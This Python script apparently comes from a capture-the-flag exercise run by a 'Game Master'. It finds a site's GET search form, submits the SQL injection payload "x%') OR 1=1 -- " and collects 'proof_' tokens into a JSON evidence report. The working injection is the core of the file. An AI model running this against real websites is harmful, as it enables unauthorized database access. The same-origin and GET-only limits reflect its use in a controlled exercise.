#!/usr/bin/env python3
"""Extract a proof through the assigned target's vulnerable GET search form."""

from __future__ import annotations

import argparse
from datetime import datetime, timezone
import hashlib
import json
from pathlib import Path
import re
import sys
from urllib.parse import urlencode, urljoin, urlsplit, urlunsplit

from inspect_target import PageExtractor, fetch, normalize_url, origin, safe_filename


PROOF_RE = re.compile(r"\bproof[_-][A-Za-z0-9_-]{12,}\b")
INJECTION = "x%') OR 1=1 -- "


def decode_body(body: bytes, content_type: str) -> str:
    match = re.search(r"charset\s*=\s*['\"]?([^;'\"]+)", content_type, re.IGNORECASE)
    charset = match.group(1).strip() if match else "utf-8"
    try:
        return body.decode(charset, errors="replace")
    except LookupError:
        return body.decode("utf-8", errors="replace")


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Passively submit one tautological SQL query to an assigned GET search form."
    )
    parser.add_argument("target", help="absolute target URL assigned by the Game Master")
    parser.add_argument("--output-dir", type=Path, help="evidence directory")
    parser.add_argument("--timeout", type=float, default=10.0)
    args = parser.parse_args()
    if args.timeout <= 0:
        parser.error("--timeout must be greater than zero")

    try:
        target = normalize_url(args.target)
        target_origin = origin(target)
    except ValueError as exc:
        parser.error(str(exc))
    host = urlsplit(target).hostname or "target"
    output_dir = args.output_dir or Path("web-evidence") / f"{host}-sqli"
    output_dir.mkdir(parents=True, exist_ok=True)

    root = fetch(target, target_origin, args.timeout)
    root_body = root.pop("_body", b"")
    if root.get("status") != 200 or not isinstance(root_body, bytes):
        print(json.dumps({"error": "target root could not be read"}, indent=2))
        return 1
    root_file = output_dir / safe_filename(1, target)
    root_file.write_bytes(root_body)

    extractor = PageExtractor()
    extractor.feed(decode_body(root_body, str(root.get("headers", {}).get("content-type", ""))))
    search_form = next(
        (
            item
            for item in extractor.forms
            if item.get("method") == "GET"
            and any(
                isinstance(control, dict) and control.get("name")
                for control in item.get("controls", [])
            )
        ),
        None,
    )
    if search_form is None:
        print(json.dumps({"error": "no GET search form found"}, indent=2))
        return 1
    controls = search_form.get("controls", [])
    field = next(
        control["name"]
        for control in controls
        if isinstance(control, dict) and control.get("name")
    )
    action = str(search_form.get("action", ""))
    search_url = normalize_url(urljoin(target, action or target))
    if origin(search_url) != target_origin:
        print(json.dumps({"error": "search form leaves the assigned origin"}, indent=2))
        return 1
    parts = urlsplit(search_url)
    query = parts.query
    encoded = urlencode({field: INJECTION})
    final_url = urlunsplit(
        (parts.scheme, parts.netloc, parts.path, f"{query}&{encoded}" if query else encoded, "")
    )
    result = fetch(final_url, target_origin, args.timeout)
    body = result.pop("_body", b"")
    if result.get("status") != 200 or not isinstance(body, bytes):
        print(json.dumps({"error": "search request failed", "status": result.get("status")}, indent=2))
        return 1

    body_file = output_dir / safe_filename(2, final_url)
    body_file.write_bytes(body)
    digest = hashlib.sha256(body).hexdigest()
    proofs = [
        {
            "answer": value,
            "source_url": str(result.get("final_url", final_url)),
            "sha256": digest,
            "body_file": body_file.name,
        }
        for value in dict.fromkeys(PROOF_RE.findall(body.decode("utf-8", errors="replace")))
    ]
    report_path = output_dir / "report.json"
    report_path.write_text(
        json.dumps(
            {
                "target": target,
                "created_at": datetime.now(timezone.utc).isoformat(),
                "form_action": search_url,
                "field": field,
                "request_policy": {
                    "method": "GET",
                    "same_origin_only": True,
                    "state_changing_requests": False,
                },
                "root": {
                    "status": root.get("status"),
                    "body_sha256": hashlib.sha256(root_body).hexdigest(),
                    "body_file": root_file.name,
                },
                "search": {
                    "status": result.get("status"),
                    "source_url": str(result.get("final_url", final_url)),
                    "body_sha256": digest,
                    "body_file": body_file.name,
                },
                "proofs": proofs,
            },
            indent=2,
            ensure_ascii=False,
        )
        + "\n",
        encoding="utf-8",
    )
    print(json.dumps({"report": str(report_path), "proofs": proofs}, indent=2))
    return 0 if proofs else 1


if __name__ == "__main__":
    sys.exit(main())
